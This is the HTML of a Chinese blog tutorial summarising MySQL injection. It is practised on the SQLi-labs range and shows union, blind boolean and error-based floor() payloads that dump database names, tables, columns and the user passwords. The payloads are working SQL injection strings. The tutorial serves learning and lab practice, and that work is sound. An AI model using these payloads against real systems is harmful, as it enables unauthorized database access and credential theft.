@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="txO_xxvvMDiJI6ShplVu0gHWx_MpeOmy5lkuhkkKu2g">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="1、SQL注入原理当服务器把用户输入的字符串当作SQL语句去执行时，就会产生注入。  2、注入的类型常见的注入分为7类:    联合注入   盲注   报错注入   延时注入 二次注入 堆叠注入 宽字节注入">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql注入总结">
+<meta property="og:url" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
+<meta property="og:site_name" content="Ljierui Blog">
+<meta property="og:description" content="1、SQL注入原理当服务器把用户输入的字符串当作SQL语句去执行时，就会产生注入。  2、注入的类型常见的注入分为7类:    联合注入   盲注   报错注入   延时注入 二次注入 堆叠注入 宽字节注入">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png">
+<meta property="og:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png">
+<meta property="og:image" content="http://example.com/images/sql/3.png">
+<meta property="og:image" content="http://example.com/images/sql/4.png">
+<meta property="og:image" content="http://example.com/images/sql/4.png">
+<meta property="og:image" content="http://example.com/images/sql/6.png">
+<meta property="og:image" content="http://example.com/images/sql/7.png">
+<meta property="og:image" content="http://example.com/images/sql/8.png">
+<meta property="og:image" content="http://example.com/images/sql/10.png">
+<meta property="og:image" content="http://example.com/images/sql/11.png">
+<meta property="og:image" content="http://example.com/images/sql/12.png">
+<meta property="og:image" content="http://example.com/images/sql/13.png">
+<meta property="og:image" content="http://example.com/images/sql/14.png">
+<meta property="og:image" content="http://example.com/images/sql/15.png">
+<meta property="og:image" content="http://example.com/images/sql/16.png">
+<meta property="og:image" content="http://example.com/images/sql/17.png">
+<meta property="og:image" content="http://example.com/images/sql/18.png">
+<meta property="og:image" content="http://example.com/images/sql/19.png">
+<meta property="og:image" content="http://example.com/images/sql/20.png">
+<meta property="og:image" content="http://example.com/images/sql/21.png">
+<meta property="og:image" content="http://example.com/images/sql/22.png">
+<meta property="og:image" content="http://example.com/images/sql/23.png">
+<meta property="og:image" content="http://example.com/images/sql/24.png">
+<meta property="og:image" content="http://example.com/images/sql/25.png">
+<meta property="og:image" content="http://example.com/images/sql/26.png">
+<meta property="og:image" content="http://example.com/images/sql/27.png">
+<meta property="article:published_time" content="2021-06-27T08:22:50.000Z">
+<meta property="article:modified_time" content="2021-06-27T13:42:22.880Z">
+<meta property="article:author" content="Ljierui">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="SQL注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png">
+
+<link rel="canonical" href="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Mysql注入总结 | Ljierui Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Ljierui Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">这个人很懒,什么都没留下</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">2</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.png">
+      <meta itemprop="name" content="Ljierui">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ljierui Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Mysql注入总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-06-27 16:22:50 / 修改时间：21:42:22" itemprop="dateCreated datePublished" datetime="2021-06-27T16:22:50+08:00">2021-06-27</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>7 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1、SQL注入原理"><a href="#1、SQL注入原理" class="headerlink" title="1、SQL注入原理"></a>1、SQL注入原理</h2><pre><code>当服务器把用户输入的字符串当作SQL语句去执行时，就会产生注入。
+</code></pre>
+<h2 id="2、注入的类型"><a href="#2、注入的类型" class="headerlink" title="2、注入的类型"></a>2、注入的类型</h2><p>常见的注入分为7类:  </p>
+<ul>
+<li>联合注入  </li>
+<li>盲注  </li>
+<li>报错注入  </li>
+<li>延时注入</li>
+<li>二次注入</li>
+<li>堆叠注入</li>
+<li>宽字节注入</li>
+</ul>
+<span id="more"></span>
+
+<h2 id="3、常见的注入利用方式"><a href="#3、常见的注入利用方式" class="headerlink" title="3、常见的注入利用方式"></a>3、常见的注入利用方式</h2><ul>
+<li>测试环境：SQlilabs靶场 </li>
+</ul>
+<h3 id="一-、判断注入"><a href="#一-、判断注入" class="headerlink" title="(一)、判断注入"></a>(一)、判断注入</h3><p>首先判断注入点是否存在，当发现一个URL为：<span class="exturl" data-url="aHR0cDovL3h4eC5jb20vP2lkPTE=">http://xxx.com/?id=1<i class="fa fa-external-link-alt"></i></span><br>则可以改变id的值，使用(+、-、’、”、’)、”)、and 1=1 、or 1=1 )这些字符来观察页面是否会随着值的变化而改变。<br>后端处理SQL查询的语句一般为:  </p>
+<pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> xxx <span class="keyword">from</span> xxx <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>；</span><br></pre></td></tr></table></figure>
+</code></pre>
+<p>由图一可以看到页面报错了，由与加入了单引号’ ，SQL解析了这个单引号，但发现没有第二个单引号来与它闭合，所有就会抛出这个错误。  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：  	</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img src="/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/1.png" alt="图一"></p>
+<p>然后使用 and 1=1 , 1=2 判断注入点，查看页面回显是否正常。<br>注意要·使用注释符把后面的语句给注释掉，如果不注释掉后面的语句，则我们无法知道我们输入SQL语句是否正常执行。   </p>
+<pre><code>常见的注释符号：  
+--   
+--+   
+#   
+%23   
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 --+  </span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<img src="/MySQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/2.png" widith="50%">
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http://192.168.199.129:86/Less-1/?id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/3.png" widith="50%">图三
+</center>  
+
+
+<h3 id="二-、联合注入"><a href="#二-、联合注入" class="headerlink" title="(二)、联合注入"></a>(二)、联合注入</h3><h4 id="1、利用注入点"><a href="#1、利用注入点" class="headerlink" title="1、利用注入点"></a>1、利用注入点</h4><p>联合查询有两个条件：  </p>
+<ul>
+<li>两张虚拟的表需要有相同的列数。</li>
+<li>虚拟表对应列的数据类型要相同。</li>
+</ul>
+<p>所以我们想要构建联合查询的表我们就需要先判断当前表有多少列，就要使用 order by 来判断当前表有多少列。<br>一般使用二分法来快速的判断，例如：order by 100(报错),则下一个使用 order by 50 来判断。<br>由下图可以得出，当 order by 3 时，页面正常，order by 4时，则页面报错。可以得出当前表中的列数是3。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3--+</span></span><br></pre></td></tr></table></figure>
+<center>页面正常 
+<img src="./images/sql/4.png" widith="50%">
+</center>  
+    
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 4--+</span></span><br></pre></td></tr></table></figure>
+<center>页面错误 
+<img src="./images/sql/4.png" widith="50%">
+</center>  
+
+
+<h4 id="2、查找显错位"><a href="#2、查找显错位" class="headerlink" title="2、查找显错位"></a>2、查找显错位</h4><p>知道了当前表的列数我们就开始判断第几列的内容会显示到页面中来。</p>
+<p>在这里我们需要知道，我们构建union select语句时，当前面的查询语句为假，也就是数据不存在时，union select之后查询出的结果就会显示在页面中。这里我们可以通过在前面查询语句中添加 and 1=2 使语句变假，也可以直接将id传入一个负数，来使语句变假。<br>由下图可以看到，2和3可以在网页上输出。<br>注：有时列数多的时候，显错位会藏在页面的源码中，要右键审查元素查找，所有一般可以使用一些字符串(null,hello)来显示会方便查找，然后在页面源码中搜索哪里出现了这些特定的字符串就是显错位。</p>
+<pre><code><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3--+</span></span><br></pre></td></tr></table></figure>
+</code></pre>
+<center>
+<img src="./images/sql/6.png" widith="50%">
+</center>
+
+<h4 id="3、查看当前数据库"><a href="#3、查看当前数据库" class="headerlink" title="3、查看当前数据库"></a>3、查看当前数据库</h4><p>使用 database()和version()函数分别输出当前的数据库名和版本<br>注：<br>1、 information_schema是系统的自带库，所有的数据库的信息都存放在里面。</p>
+<p>2、group_concat 表示一次性查出的东西 ，也可以使用 limit 排序查出。  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：    </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,database(),version() --+</span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/7.png" widith="50%">
+</center>
+
+ 
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看所有数据库  </span><br><span class="line">语句:</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(schema_name) from  information_schema.schemata --+</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="4、查看当前数据库下的所有的表"><a href="#4、查看当前数据库下的所有的表" class="headerlink" title="4、查看当前数据库下的所有的表"></a>4、查看当前数据库下的所有的表</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database() --+ </span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/8.png" widith="50%">
+</center>
+
+<h4 id="5、查看表中存在的字段名"><a href="#5、查看表中存在的字段名" class="headerlink" title="5、查看表中存在的字段名"></a>5、查看表中存在的字段名</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句:   </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = &#x27;</span>users<span class="string">&#x27;--+  </span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/10.png" widith="50%">
+</center>
+
+<h4 id="6、查看特定字段中的数据"><a href="#6、查看特定字段中的数据" class="headerlink" title="6、查看特定字段中的数据"></a>6、查看特定字段中的数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：  </span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=2 union select 1,2,group_concat(password) from security.users--+</span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/11.png" widith="50%">
+</center>
+
+<h3 id="三-、盲注"><a href="#三-、盲注" class="headerlink" title="(三)、盲注"></a>(三)、盲注</h3><pre><code>什么是盲注?
+盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。
+</code></pre>
+<h4 id="1、盲注中常用的函数"><a href="#1、盲注中常用的函数" class="headerlink" title="1、盲注中常用的函数"></a>1、盲注中常用的函数</h4><ol>
+<li><p>mid() : 从文本字段中提取字符。<br> 用法 ： select mid(column_name,start,length) from table_name;  ·<br> 注 ： column_name（必需，要提取的字符字段）、start（必需，起始位置）、length（可选，要返回几个字符数）</p>
+</li>
+<li><p>substr() 和 substring() : 截取字符串</p>
+<p> 用法 ： string substring(string,start,length)<br> string  substr(string ,start,length)</p>
+<p> 注 ： 用法与mid（）相同。  </p>
+</li>
+<li><p>left() ：截取字符串左部指定个数的字符</p>
+<p> 用法 ：left(string，n)；<br> 注 ： string为要截取的字符串 ，n为长度</p>
+</li>
+<li><p>ORD() : 返回字符串第一个字符的ASCII值</p>
+<p> 用法 ：ORD（string）</p>
+<p> 注 ： 常用于与上述函数搭配，和ASCII()作用相同。``</p>
+</li>
+<li><p>length() : 返回字符串长度</p>
+</li>
+</ol>
+<h4 id="2、判断当前数据库"><a href="#2、判断当前数据库" class="headerlink" title="2、判断当前数据库"></a>2、判断当前数据库</h4><p>使用length()判断当前数据库名的长度由多少个字符组成。</p>
+<pre><code>语句:  
+http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) &gt; 7 --+ 页面正常
+http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 7 --+ 页面错误
+http://192.168.199.129:86/Less-5/?id=-1&#39; or length(database()) = 8 --+ 页面正常
+这里判断是大于7却不等于7，那长度就是8了·
+</code></pre>
+<center>
+<img src="./images/sql/12.png" widith="50%">
+</center>
+
+<h4 id="3、猜测数据库名"><a href="#3、猜测数据库名" class="headerlink" title="3、猜测数据库名"></a>3、猜测数据库名</h4><p>使用left()函数猜数据库名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">注：一般取中间来猜</span><br><span class="line">语句：</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">192.168</span><span class="number">.199</span><span class="number">.129</span>:<span class="number">86</span><span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and left(database(),1) =&#x27;</span>s<span class="string">&#x27; --+ 页面正常 </span></span><br><span class="line"><span class="string">数据库名的第一个字母为s，因为数据库名是:security</span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/13.png" widith="50%">
+</center>
+
+<h4 id="4、猜测表"><a href="#4、猜测表" class="headerlink" title="4、猜测表"></a>4、猜测表</h4><p>使用ascii()函数来把猜测的字母转成ascii</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ascii (substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">1</span>,<span class="number">1</span>)) <span class="operator">&gt;=</span><span class="number">101</span> <span class="comment">--+  </span></span><br><span class="line"></span><br><span class="line">ascii码 <span class="number">101</span> 对应的是字母 e</span><br><span class="line"></span><br><span class="line">猜解第二个字母：</span><br><span class="line"><span class="keyword">and</span> ORD (mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema <span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span> ),<span class="number">2</span>,<span class="number">1</span>)) <span class="operator">=</span><span class="number">109</span> <span class="comment">--+（这里是m）</span></span><br><span class="line"></span><br><span class="line">说明： 这里将第一张表的第一个字母的ascii码解出来 、当要查第二个表的时候只要排序即可（limit <span class="number">1</span>,<span class="number">1</span>）</span><br><span class="line"></span><br><span class="line">注意 ： ascii 可以使用ORD代替、substr可使用substring、mid代替</span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/14.png" widith="50%">
+</center>
+
+<h4 id="5、猜测列名"><a href="#5、猜测列名" class="headerlink" title="5、猜测列名"></a>5、猜测列名</h4><p>使用regexp()猜测表下的列名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> column_name regexp <span class="string">&#x27;^u[a-z]&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line">注：<span class="number">1</span>表示只是为了提高运行的效率查到多少就返回多少</span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/15.png" widith="50%">
+</center>
+
+<h4 id="6、获取列中的数据"><a href="#6、获取列中的数据" class="headerlink" title="6、获取列中的数据"></a>6、获取列中的数据</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语句：</span><br><span class="line"><span class="keyword">and</span> ORD(MID((<span class="keyword">SELECT</span><span class="operator">%</span><span class="number">20</span>IFNULL(<span class="built_in">CAST</span>(username <span class="keyword">AS</span> <span class="type">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> id LIMIT <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span> <span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+<center>
+<img src="./images/sql/16.png" widith="50%">
+</center>
+
+
+<h3 id="四-、报错注入"><a href="#四-、报错注入" class="headerlink" title="(四)、报错注入"></a>(四)、报错注入</h3><h4 id="1、通过floor报错"><a href="#1、通过floor报错" class="headerlink" title="1、通过floor报错"></a>1、通过floor报错</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 查询数据版本</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span>&quot;)%20 and (select 1 from (select count(*),concat( (select (select ( select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x%20 from information_schema.tables group by x )a) --+</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"># 查看当前连接用户</span><br><span class="line">?id=-1&quot;)<span class="operator">%</span><span class="number">20</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat( (<span class="keyword">select</span> (<span class="keyword">select</span> ( <span class="keyword">select</span> concat(<span class="number">0x7e</span>,<span class="keyword">user</span>(),<span class="number">0x7e</span>))) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x<span class="operator">%</span><span class="number">20</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x )a) <span class="comment">--+</span></span><br><span class="line">	</span><br><span class="line"># 查看当前连接的数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>&quot;) and (select 1 from (select count(*),concat( (select (select ( select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x%20 from information_schema.tables group by x )a) --+、</span><br><span class="line">	</span><br><span class="line"># 查看所有数据库</span><br><span class="line">?id=1&quot;)<span class="keyword">and</span>(<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> (<span class="keyword">select</span> (<span class="keyword">SELECT</span> <span class="keyword">distinct</span> concat(<span class="number">0x7e</span>,schema_name,<span class="number">0x7e</span>) <span class="keyword">FROM</span> information_schema.schemata LIMIT <span class="number">0</span>,<span class="number">1</span>)) <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span 